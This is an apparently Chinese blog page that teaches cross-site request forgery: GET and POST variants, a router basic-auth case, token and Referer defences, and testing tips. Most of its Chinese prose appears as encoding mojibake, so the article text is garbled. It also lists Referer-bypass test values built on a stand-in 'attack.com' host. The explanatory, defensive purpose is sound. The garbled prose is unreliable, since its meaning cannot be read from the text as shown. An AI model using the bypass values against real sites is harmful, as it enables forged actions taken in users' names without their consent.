        <p><b style="color:pink">##0ã€CSRFçš„ç®€ä»‹</b><br>CSRFï¼ˆCross-site request forgeryï¼‰è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œç”±äºç›®æ ‡ç«™æ— token/refereré™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ç”¨æˆ·çš„èº«ä»½å®Œæˆæ“ä½œè¾¾åˆ°å„ç§ç›®çš„ã€‚æ ¹æ®HTTPè¯·æ±‚æ–¹å¼ï¼ŒCSRFåˆ©ç”¨æ–¹å¼å¯åˆ†ä¸ºä¸¤ç§ã€‚<br><b style="color:pink">##1ã€CSRFçš„æ”»å‡»åŸç†</b><br>CSRF ç™¾åº¦ä¸Šçš„æ„æ€æ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œå…¶å®æœ€ç®€å•çš„ç†è§£æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆè®²ï¼Œå‡å¦‚ä¸€ä¸ªå¾®åšå…³æ³¨ç”¨æˆ·çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå­˜åœ¨CSRFæ¼æ´ï¼Œé‚£ä¹ˆæ­¤æ—¶é»‘å®¢åªéœ€è¦ä¼ªé€ ä¸€ä¸ªé¡µé¢è®©å—å®³è€…é—´æ¥æˆ–è€…ç›´æ¥è§¦å‘ï¼Œç„¶åè¿™ä¸ªæ¶æ„é¡µé¢å°±å¯ä»¥ä½¿ç”¨å—å®³è€…çš„å¾®åšæƒé™å»å…³æ³¨å…¶ä»–çš„äººå¾®åšè´¦æˆ·ã€‚CSRFåªè¦è¢«æ‰¹é‡åŒ–åˆ©ç”¨èµ·æ¥å…¶å±å®³è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ã€‚<br><img src="/2021/03/18/zj/1.png"><br>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªRefererçš„ä¿¡æ¯ï¼ŒRefererä¹Ÿå°±æ˜¯è¯·æ±‚æ¥æºåœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè¯·æ±‚æ˜¯ä»<a target="_blank" rel="noopener" href="http://www.sina.com.cn/">http://www.sina.com.cn</a>  è¿™é‡Œå‘èµ·çš„ã€‚ç„¶åå»æ‰Refererï¼Œå»æ‰§è¡Œè¿™ä¸ªè¯·æ±‚ï¼Œå‘ç°è¿™ä¸ªè¯·æ±‚ä»ç„¶å¯ä»¥è¿›è¡Œæ­£å¸¸çš„æœç´¢ï¼Œé‚£ä¹ˆå°±è¯´æ˜è¿™ä¸ªè¯·æ±‚æ²¡æœ‰åˆ¤æ–­è¯·æ±‚æ¥æºä¹Ÿå°±æ˜¯Refererï¼Œåœ¨è¯·æ±‚å¤´éƒ¨ä¹Ÿæ²¡æœ‰å‘ç°å­˜åœ¨tokençš„è¿¹è±¡ï¼Œé‚£ä¹ˆå¯ä»¥åˆ¤æ–­æ­¤å¤„å­˜åœ¨CSRFï¼Œè¿™ä¸ªCSRFæ˜¯æ²¡æœ‰ä»»ä½•å±å®³dçš„ã€‚<br><b style="color:pink">##2ã€CSRFæ¼æ´æˆå› åŠåˆ†æ</b><br><b style="color:blue">GETç±»å‹çš„CSRF</b><br>è¯·æ±‚ç›´æ¥æ˜¯ä¸ªGETè¯·æ±‚ï¼Œç„¶åè¯·æ±‚ä¸­æ²¡æœ‰tokenéªŒè¯å‚æ•°ï¼Œç„¶åè¿˜æœ‰ä¸€ä¸ªå›ºå®šçš„å˜é‡å¯ä»¥è¢«æ§åˆ¶ã€‚è¿™ç§æ˜¯æ¯”è¾ƒå¸¸è§çš„ä¸€ç§CSRFæ¼æ´ã€‚è¿™ç§æ¼æ´çš„æ£€æµ‹æ–¹æ³•å¾ˆç®€å•ï¼šç½‘é¡µæ“ä½œæŸåŠŸèƒ½ï¼ŒæŠ“åŒ…åï¼Œå¦‚æœå‘ç°æ»¡è¶³ä¸Šé¢æ¡ä»¶ï¼Œç„¶åå†å»é¡µé¢æµ‹è¯•ä¸‹ï¼ŒåŸºæœ¬å°±å¯ä»¥ç¡®å®šå­˜åœ¨ä¸å­˜åœ¨CSRFæ¼æ´äº†ã€‚<br>è¿™ç§ç±»å‹çš„CSRFä¸€èˆ¬æ˜¯ç”±äºç¨‹åºå‘˜å®‰å…¨æ„è¯†ä¸å¼ºé€ æˆçš„ã€‚GETç±»å‹çš„CSRFåˆ©ç”¨éå¸¸ç®€å•ï¼Œåªéœ€è¦ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œæ‰€ä»¥ï¼Œä¸€èˆ¬ä¼šè¿™æ ·åˆ©ç”¨ï¼š<br><img src="/2021/03/18/zj/3.png"><br>åœ¨è®¿é—®å«æœ‰è¿™ä¸ªimgçš„é¡µé¢åï¼ŒæˆåŠŸå‘<a target="_blank" rel="noopener" href="http://wooyun.org/csrf.php?xx=11">http://wooyun.org/csrf.php?xx=11</a>  å‘å‡ºäº†ä¸€æ¬¡HTTPè¯·æ±‚ã€‚æ‰€ä»¥ï¼Œå¦‚æœå°†è¯¥ç½‘å€æ›¿æ¢ä¸ºå­˜åœ¨GETå‹CSRFçš„åœ°å€ï¼Œå°±èƒ½å®Œæˆæ”»å‡»äº†ã€‚<br><b style="color:blue">POSTç±»å‹çš„CSRF</b><br>postè¯·æ±‚ä¸­æ²¡æœ‰tokenå‚æ•°ï¼Œç„¶åè¯·æ±‚ä¹Ÿæ²¡æœ‰éªŒè¯refererä¿¡æ¯ã€‚è¿™ç§æ˜¯å­˜åœ¨CSRFæƒ…å†µæœ€å¤šçš„ä¸€ç§ã€‚è¿™ç§æ¼æ´çš„æ£€æµ‹æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼šç½‘é¡µæ“ä½œæŸåŠŸèƒ½ï¼ŒæŠ“åŒ…åï¼Œå¦‚æœå‘ç°æ²¡æœ‰tokenç­‰å‚æ•°ï¼Œç„¶åå°±å°†refererä¿¡æ¯è®¾ç½®ä¸ºç©ºï¼Œå†æ¬¡å‘åŒ…è¯·æ±‚ï¼Œå¦‚æœè¯·æ±‚æˆåŠŸäº†ï¼Œå°±è¯´æ˜è¿™é‡Œæœ‰CSRFæ¼æ´ã€‚<br>è¿™ç§ç±»å‹çš„CSRFå±å®³æ²¡æœ‰GETå‹çš„å¤§ï¼Œåˆ©ç”¨èµ·æ¥é€šå¸¸ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè‡ªåŠ¨æäº¤çš„è¡¨å•ï¼Œå¦‚ï¼š<br><img src="/2021/03/18/zj/2.png"></p>
<p>è®¿é—®è¯¥é¡µé¢åï¼Œè¡¨å•ä¼šè‡ªåŠ¨æäº¤ï¼Œç›¸å½“äºæ¨¡æ‹Ÿç”¨æˆ·å®Œæˆäº†ä¸€æ¬¡POSTæ“ä½œ<br><b style="color:blue">å…¶ä»–ç±»å‹çš„CSRF</b><br>è¿‡åŸºç¡€è®¤è¯çš„CSRF(å¸¸ç”¨äºè·¯ç”±å™¨):<br>POC:<br><img src="/2021/03/18/zj/4.png"><br>åŠ è½½è¯¥å›¾ç‰‡åï¼Œè·¯ç”±å™¨ä¼šç»™ç”¨æˆ·ä¸€ä¸ªåˆæ³•çš„SESSIONï¼Œå°±å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œäº†ã€‚<br><b style="color:blue">##4ã€å¦‚ä½•ä¿®å¤</b><br>é’ˆå¯¹CSRFçš„é˜²èŒƒï¼Œæœ‰ä»¥ä¸‹å‡ ç‚¹è¦æ³¨æ„ï¼š<br><b>å…³é”®æ“ä½œåªæ¥å—POSTè¯·æ±‚</b><br><b>éªŒè¯ç </b><br>CSRFæ”»å‡»çš„è¿‡ç¨‹ï¼Œå¾€å¾€æ˜¯åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ„é€ ç½‘ç»œè¯·æ±‚ã€‚æ‰€ä»¥å¦‚æœä½¿ç”¨éªŒè¯ç ï¼Œé‚£ä¹ˆæ¯æ¬¡æ“ä½œéƒ½éœ€è¦ç”¨æˆ·è¿›è¡Œäº’åŠ¨ï¼Œä»è€Œç®€å•æœ‰æ•ˆçš„é˜²å¾¡äº†CSRFæ”»å‡»ã€‚</p>
<p>ä½†æ˜¯å¦‚æœä½ åœ¨ä¸€ä¸ªç½‘ç«™ä½œå‡ºä»»ä½•ä¸¾åŠ¨éƒ½è¦è¾“å…¥éªŒè¯ç ä¼šä¸¥é‡å½±å“ç”¨æˆ·ä½“éªŒï¼Œæ‰€ä»¥éªŒè¯ç ä¸€èˆ¬åªå‡ºç°åœ¨ç‰¹æ®Šæ“ä½œé‡Œé¢ï¼Œæˆ–è€…åœ¨æ³¨å†Œæ—¶å€™ä½¿ç”¨</p>
<p><b>æ£€æµ‹refer</b><br>å¸¸è§çš„äº’è”ç½‘é¡µé¢ä¸é¡µé¢ä¹‹é—´æ˜¯å­˜åœ¨è”ç³»çš„ï¼Œæ¯”å¦‚ä½ åœ¨<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>  åº”è¯¥æ˜¯æ‰¾ä¸åˆ°é€šå¾€<a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a>  çš„é“¾æ¥çš„ï¼Œå†æ¯”å¦‚ä½ åœ¨è®ºå›ç•™è¨€ï¼Œé‚£ä¹ˆä¸ç®¡ä½ ç•™è¨€åé‡å®šå‘åˆ°å“ªé‡Œå»äº†ï¼Œä¹‹å‰çš„é‚£ä¸ªç½‘å€ä¸€å®šä¼šåŒ…å«ç•™è¨€çš„è¾“å…¥æ¡†ï¼Œè¿™ä¸ªä¹‹å‰çš„ç½‘å€å°±ä¼šä¿ç•™åœ¨æ–°é¡µé¢å¤´æ–‡ä»¶çš„Refererä¸­</p>
<p>é€šè¿‡æ£€æŸ¥Refererçš„å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ¤æ–­è¿™ä¸ªè¯·æ±‚æ˜¯åˆæ³•çš„è¿˜æ˜¯éæ³•çš„ï¼Œä½†æ˜¯é—®é¢˜å‡ºåœ¨æœåŠ¡å™¨ä¸æ˜¯ä»»ä½•æ—¶å€™éƒ½èƒ½æ¥å—åˆ°Refererçš„å€¼ï¼Œæ‰€ä»¥Refere Check ä¸€èˆ¬ç”¨äºç›‘æ§CSRFæ”»å‡»çš„å‘ç”Ÿï¼Œè€Œä¸ç”¨æ¥æŠµå¾¡æ”»å‡»ã€‚</p>
<p><b>Token</b><br>ç›®å‰ä¸»æµçš„åšæ³•æ˜¯ä½¿ç”¨TokenæŠµå¾¡CSRFæ”»å‡»ã€‚ä¸‹é¢é€šè¿‡åˆ†æCSRF æ”»å‡»æ¥ç†è§£ä¸ºä»€ä¹ˆTokenèƒ½å¤Ÿæœ‰æ•ˆ</p>
<p>CSRFæ”»å‡»è¦æˆåŠŸçš„æ¡ä»¶åœ¨äºæ”»å‡»è€…èƒ½å¤Ÿé¢„æµ‹æ‰€æœ‰çš„å‚æ•°ä»è€Œæ„é€ å‡ºåˆæ³•çš„è¯·æ±‚ã€‚æ‰€ä»¥æ ¹æ®ä¸å¯é¢„æµ‹æ€§åŸåˆ™ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å‚æ•°è¿›è¡ŒåŠ å¯†ä»è€Œé˜²æ­¢CSRFæ”»å‡»ã€‚</p>
<p>å¦ä¸€ä¸ªæ›´é€šç”¨çš„åšæ³•æ˜¯ä¿æŒåŸæœ‰å‚æ•°ä¸å˜ï¼Œå¦å¤–æ·»åŠ ä¸€ä¸ªå‚æ•°Tokenï¼Œå…¶å€¼æ˜¯éšæœºçš„ã€‚è¿™æ ·æ”»å‡»è€…å› ä¸ºä¸çŸ¥é“Tokenè€Œæ— æ³•æ„é€ å‡ºåˆæ³•çš„è¯·æ±‚è¿›è¡Œæ”»å‡»ã€‚</p>
<p>Token ä½¿ç”¨åŸåˆ™</p>
<ol>
<li>Tokenè¦è¶³å¤Ÿéšæœºâ€”â€”â€”â€”åªæœ‰è¿™æ ·æ‰ç®—ä¸å¯é¢„æµ‹
</li><li>Tokenæ˜¯ä¸€æ¬¡æ€§çš„ï¼Œå³æ¯æ¬¡è¯·æ±‚æˆåŠŸåè¦æ›´æ–°Tokenâ€”â€”â€”â€”è¿™æ ·å¯ä»¥å¢åŠ æ”»å‡»éš¾åº¦ï¼Œå¢åŠ é¢„æµ‹éš¾åº¦
</li><li>Tokenè¦æ³¨æ„ä¿å¯†æ€§â€”â€”â€”â€”æ•æ„Ÿæ“ä½œä½¿ç”¨postï¼Œé˜²æ­¢Tokenå‡ºç°åœ¨URLä¸­
</li><li>å¤åˆ¶ä»£ç 
</li></ol>
<b style="color:blue">##5ã€æµ‹è¯•CSRFä¸­æ³¨æ„çš„é—®é¢˜</b>
å¦‚æœåŒåŸŸä¸‹å­˜åœ¨xssçš„è¯ï¼Œé™¤äº†éªŒè¯ç ï¼Œå…¶ä»–çš„æ–¹å¼éƒ½æ— æ³•é˜²å¾¡è¿™ä¸ªé—®é¢˜ã€‚

<p>æœ‰ä¸ªç¨‹åºåç«¯å¯èƒ½æ˜¯ç”¨REQUESTæ–¹å¼æ¥å—çš„ï¼Œè€Œç¨‹åºé»˜è®¤æ˜¯POSTè¯·æ±‚ï¼Œå…¶å®æ”¹æˆGETæ–¹å¼è¯·æ±‚ä¹Ÿå¯ä»¥å‘é€è¿‡å»ï¼Œå­˜åœ¨å¾ˆä¸¥é‡çš„éšæ‚£ã€‚</p>
<p>å½“åªé‡‡ç”¨referé˜²å¾¡æ—¶ï¼Œå¯ä»¥æŠŠè¯·æ±‚ä¸­çš„ä¿®æ”¹æˆå¦‚ä¸‹è¯•è¯•èƒ½å¦ç»•è¿‡ï¼š</p>
<p>åŸå§‹referï¼š<a target="_blank" rel="noopener" href="http://test.com/index.php">http://test.com/index.php</a></p>
<p>æµ‹è¯•å‡ ç§æ–¹å¼ï¼ˆä»¥ä¸‹æ–¹å¼å¯ä»¥é€šè¿‡çš„è¯å³å¯èƒ½å­˜åœ¨é—®é¢˜ï¼‰ï¼š</p>
<ul>
<li>http://test.com.attack.com/index.php
</li><li>http://attack.com/test.com/index.php
</li><li>[ç©º]
</li><li>å¤åˆ¶ä»£ç 
</li></ul>

<p>referä¸ºç©ºæ„é€ çš„æ–¹æ³•ï¼š<br><img src="/2021/03/18/zj/5.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  

</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2021 Jialu
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >æå®¢åˆ°è®¿æ•°: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">æœ¬é¡µé˜…è¯»é‡: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>


<script src="/js/main.js"></script>


    <script>
        $(document).ready(function() {
            var backgroundnum = 1;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>


<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'xxxxx', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->



	<script>
	var _hmt = _hmt || [];
	(function() {
	  var hm = document.createElement("script");
	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
	  var s = document.getElementsByTagName("script")[0]; 
	  s.parentNode.insertBefore(hm, s);
	})();
	</script>



<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(
            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<script type="text/javascript" src="/js/love.js"></script>
<!--åŠ¨æ€çº¿æ¡èƒŒæ™¯-->
<script type="text/javascript"
color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
</script>
<!-- é›ªèŠ±ç‰¹æ•ˆ -->
<script type="text/javascript" src="\js\snow.js"></script>
